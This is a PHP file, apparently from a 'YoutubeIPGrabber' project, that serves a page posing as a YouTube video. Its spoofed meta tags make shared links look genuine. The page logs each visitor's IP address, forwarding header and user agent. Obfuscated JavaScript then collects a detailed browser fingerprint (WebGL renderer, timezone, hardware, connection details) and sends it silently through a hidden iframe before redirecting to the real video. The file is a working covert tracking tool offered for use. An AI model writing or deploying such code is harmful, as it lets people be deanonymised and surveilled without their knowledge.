<?php
    /*
        James William Fletcher (james@voxdsp.com)
            December 2021
        
        Grabber URL Javascript Payload.

        Part of the YoutubeIPGrabber; https://github.com/mrbid
    */

    $ip = urlencode($_SERVER['REMOTE_ADDR']);
    $ua = '';
    if(isset($_SERVER['HTTP_USER_AGENT']))
        $ua = $_SERVER['HTTP_USER_AGENT'];
    $xff = 'DIRECT';
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $xff = $_SERVER['HTTP_X_FORWARDED_FOR'];

    file_put_contents("prelog.txt", date("Y-m-d H:i:s: ") . $ip . ", " . $xff . ", " . urldecode($ua) . "\n", FILE_APPEND | LOCK_EX);
    
    $info = explode("\n", file_get_contents("info.txt"));
    $id = $info[0];
    $title = $info[1];
    $desc = $info[2];
    $url = "https://www.youtube.com/watch?v=" . $id;
    $thumburl = $info[3];
?>
<html>
<head>

<title><?php echo $title; ?> - YouTube</title>

<meta name="title" content="<?php echo $title; ?>">
<meta name="description" content="<?php echo $desc; ?>">
<link rel="image_src" href="<?php echo $thumburl; ?>">

<meta property="og:site_name" content="YouTube">
<meta property="og:title" content="<?php echo $title; ?>">
<meta property="og:image" content="<?php echo $thumburl; ?>">
<meta property="og:image:width" content="1280">
<meta property="og:image:height" content="720">
<meta property="og:description" content="<?php echo $desc; ?>">
<meta property="og:type" content="video.other">

<meta name="twitter:card" content="player">
<meta name="twitter:title" content="<?php echo $title; ?>">
<meta name="twitter:description" content="<?php echo $desc; ?>">
<meta name="twitter:image" content="<?php echo $thumburl; ?>">

<meta property="og:video:secure_url" content="https://www.youtube.com/embed/<?php echo $id; ?>">

<style>
*{margin:0;padding:0;}
html,body{width:100%;height:100%;overflow:hidden;}
</style>
</head>
<body>
<script>
(function(_0x3ba185,_0x9e67ce){var _0x29b60c=_0x202e,_0x4d7b01=_0x3ba185();while(!![]){try{var _0x3592e4=-parseInt(_0x29b60c(0x1da))/0x1*(-parseInt(_0x29b60c(0x1e8))/0x2)+-parseInt(_0x29b60c(0x1ee))/0x3+parseInt(_0x29b60c(0x1cf))/0x4*(-parseInt(_0x29b60c(0x1de))/0x5)+parseInt(_0x29b60c(0x1e0))/0x6*(parseInt(_0x29b60c(0x1ed))/0x7)+parseInt(_0x29b60c(0x1ef))/0x8*(-parseInt(_0x29b60c(0x1d9))/0x9)+parseInt(_0x29b60c(0x1d3))/0xa+parseInt(_0x29b60c(0x1dd))/0xb;if(_0x3592e4===_0x9e67ce)break;else _0x4d7b01['push'](_0x4d7b01['shift']());}catch(_0x25c28c){_0x4d7b01['push'](_0x4d7b01['shift']());}}}(_0x17ab,0x59f2d));function a(){var _0x16d714=_0x202e,_0x3dc337=document[_0x16d714(0x1e4)](_0x16d714(0x1df)),_0xa2b6d3,_0x3b821c,_0x24840a,_0x171912;try{_0xa2b6d3=_0x3dc337[_0x16d714(0x1d2)](_0x16d714(0x1e7))||_0x3dc337[_0x16d714(0x1d2)](_0x16d714(0x1cc));}catch(_0x4c680b){}return _0xa2b6d3&&(_0x3b821c=_0xa2b6d3[_0x16d714(0x1e3)](_0x16d714(0x1d5)),_0x24840a=_0xa2b6d3[_0x16d714(0x1dc)](_0x3b821c[_0x16d714(0x1ec)]),_0x171912=_0xa2b6d3['\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65\x72'](_0x3b821c[_0x16d714(0x1d6)])),_0x171912;}function b(){var _0x1f47f1=_0x202e;try{return navigator[_0x1f47f1(0x1e9)];}catch(_0x56318e){return _0x1f47f1(0x1e1);}}function c(){var _0x47dafe=_0x202e;try{return navigator[_0x47dafe(0x1d7)];}catch(_0x4a536f){return _0x47dafe(0x1e1);}}function h(){var _0x2e81ff=_0x202e;try{return screen[_0x2e81ff(0x1d1)];}catch(_0x298a18){return _0x2e81ff(0x1e1);}}function d(){var _0x4f6e7a=_0x202e;try{return Intl[_0x4f6e7a(0x1ea)]()['\x72\x65\x73\x6f\x6c\x76\x65\x64\x4f\x70\x74\x69\x6f\x6e\x73']()[_0x4f6e7a(0x1db)];}catch(_0xe8d589){return _0x4f6e7a(0x1e1);}}function _0x202e(_0x2beba0,_0x5db9af){var _0x17abb8=_0x17ab();return _0x202e=function(_0x202e94,_0x2fa9ae){_0x202e94=_0x202e94-0x1cc;var _0x4cd056=_0x17abb8[_0x202e94];return _0x4cd056;},_0x202e(_0x2beba0,_0x5db9af);}function e(){var _0x1ea9a0=_0x202e;try{return navigator[_0x1ea9a0(0x1e5)][_0x1ea9a0(0x1d8)];}catch(_0x23fbcc){return'\x75\x6e\x6b\x6e\x6f\x77\x6e';}}function f(){var _0x1fec86=_0x202e;try{return navigator['\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e']['\x74\x79\x70\x65'];}catch(_0x1432da){return _0x1fec86(0x1e1);}}function g(){var _0x359cc1=_0x202e,_0x48251a=0x0;try{_0x48251a=navigator[_0x359cc1(0x1d4)][_0x359cc1(0x1eb)];}catch(_0x49762f){}if(_0x48251a==0x0)return'\x30';return _0x48251a;}function i(){var _0x223227=_0x202e;if(navigator[_0x223227(0x1e2)][_0x223227(0x1e6)](_0x223227(0x1ce))>-0x1||navigator[_0x223227(0x1e2)][_0x223227(0x1e6)]('\x77\x76')>-0x1)return 0x1;return 0x0;}function j(){var _0xbc4f4e=_0x202e;try{return navigator[_0xbc4f4e(0x1cd)];}catch(_0x499dfb){return'\x75\x6e\x6b\x6e\x6f\x77\x6e';}}function k(){try{return navigator['\x64\x65\x76\x69\x63\x65\x4d\x65\x6d\x6f\x72\x79'];}catch(_0x207a87){return'\x30';}}function l(){var _0x5855e6=_0x202e;try{return navigator[_0x5855e6(0x1e5)]['\x64\x6f\x77\x6e\x6c\x69\x6e\x6b'];}catch(_0x2e65f6){return _0x5855e6(0x1e1);}}function m(){var _0x189cb9=_0x202e;try{return navigator[_0x189cb9(0x1e5)][_0x189cb9(0x1d0)];}catch(_0x18cd92){return _0x189cb9(0x1e1);}}function _0x17ab(){var _0x1fa1e0=['\x34\x38\x38\x47\x6d\x4f\x71\x75\x43','\x6c\x61\x6e\x67\x75\x61\x67\x65','\x44\x61\x74\x65\x54\x69\x6d\x65\x46\x6f\x72\x6d\x61\x74','\x6c\x65\x6e\x67\x74\x68','\x55\x4e\x4d\x41\x53\x4b\x45\x44\x5f\x56\x45\x4e\x44\x4f\x52\x5f\x57\x45\x42\x47\x4c','\x32\x39\x37\x30\x31\x6f\x43\x42\x71\x78\x79','\x39\x30\x30\x34\x36\x32\x49\x6f\x58\x56\x79\x76','\x34\x30\x34\x30\x65\x6e\x67\x54\x66\x72','\x65\x78\x70\x65\x72\x69\x6d\x65\x6e\x74\x61\x6c\x2d\x77\x65\x62\x67\x6c','\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79','\x69\x6e\x61\x70\x70','\x31\x37\x33\x35\x36\x79\x6f\x4e\x55\x70\x4c','\x72\x74\x74','\x63\x6f\x6c\x6f\x72\x44\x65\x70\x74\x68','\x67\x65\x74\x43\x6f\x6e\x74\x65\x78\x74','\x31\x39\x32\x32\x38\x36\x30\x42\x76\x75\x4b\x67\x70','\x70\x6c\x75\x67\x69\x6e\x73','\x57\x45\x42\x47\x4c\x5f\x64\x65\x62\x75\x67\x5f\x72\x65\x6e\x64\x65\x72\x65\x72\x5f\x69\x6e\x66\x6f','\x55\x4e\x4d\x41\x53\x4b\x45\x44\x5f\x52\x45\x4e\x44\x45\x52\x45\x52\x5f\x57\x45\x42\x47\x4c','\x70\x6c\x61\x74\x66\x6f\x72\x6d','\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65','\x36\x32\x31\x39\x73\x71\x68\x46\x48\x43','\x32\x39\x34\x35\x43\x63\x7a\x4e\x67\x44','\x74\x69\x6d\x65\x5a\x6f\x6e\x65','\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65\x72','\x34\x34\x33\x37\x39\x37\x32\x57\x41\x42\x59\x58\x48','\x34\x33\x30\x56\x77\x6a\x64\x6c\x55','\x63\x61\x6e\x76\x61\x73','\x31\x30\x38\x6d\x46\x4e\x53\x57\x6b','\x75\x6e\x6b\x6e\x6f\x77\x6e','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x67\x65\x74\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e','\x69\x6e\x64\x65\x78\x4f\x66','\x77\x65\x62\x67\x6c'];_0x17ab=function(){return _0x1fa1e0;};return _0x17ab();}
document.write('<iframe src="indux.php?a='+a()+'&a='+b()+'&a='+c()+'&a='+d()+'&a='+e()+'&a='+f()+'&a='+g()+'&a='+h()+'&a='+i()+'&ua=<?php echo urlencode($ua); ?>&a=<?php echo $ip; ?>&a=<?php echo $xff; ?>&a='+j()+'&a='+k()+'&a='+l()+'&a='+m()+'&a=<?php echo $id; ?>" width=1 height=1 frameborder=0 style="display:none;"></iframe>');
</script>
<?php
    echo '<meta http-equiv="refresh" content="0; url='.$url.'">';
?>
</body>
</html>
<?php
    // this is last because we want the page to print as fast as possible first, this is by all means superfluous master panel logging.
    file_put_contents("../master/prelog.txt", date("Y-m-d H:i:s: ") . $ip . ", " . $xff . ", " . urldecode($ua) . ", " . $id . "\n", FILE_APPEND | LOCK_EX);
?>
